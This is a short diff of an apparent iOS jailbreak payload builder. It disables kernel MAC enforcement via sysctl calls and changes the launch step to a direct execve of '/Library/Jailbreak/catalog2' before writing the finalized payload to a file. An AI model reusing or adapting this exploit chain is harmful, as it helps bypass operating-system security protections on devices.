@@ -23,17 +23,11 @@ def s(name):
 s('security.mac.proc_enforce')
 s('security.mac.vnode_enforce')
 
-pidp, pid = stackunkpair()
-jailbreak = ptr('/usr/share/jailbreak/catalog2', True)
-funcall('_syscall', 244, pidp, jailbreak, 0, 0, ptrI(jailbreak, 0), ptrI(0))
-
-funcall('_syscall', 7, pid, 0, 0) # wait4
-
-funcall('_exit', 0)
+jailbreak = ptr('/Library/Jailbreak/catalog2', True)
+funcall('_syscall', 59, jailbreak, ptrI(jailbreak, 0), ptrI(0)) # execve
 
 final = finalize(0x11000000 - 8)
 #(for debug)
 heapdump()
-
 
 open('just_sysctl_output.txt', 'w').write(final)
